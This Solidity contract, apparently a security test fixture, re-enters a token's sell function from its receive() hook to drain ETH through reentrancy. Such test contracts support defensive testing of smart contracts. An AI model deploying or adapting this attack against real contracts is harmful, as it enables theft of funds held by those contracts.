// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {IHigherrrrrrr} from "../../src/interfaces/IHigherrrrrrr.sol";

contract ReentrancyAttacker {
    IHigherrrrrrr public token;

    constructor(address _token) {
        token = IHigherrrrrrr(payable(_token));
    }

    receive() external payable {
        if (address(token).balance >= msg.value) {
            token.sell(1e18, address(this), "", IHigherrrrrrr.MarketType.BONDING_CURVE, 0, 0);
        }
    }
}
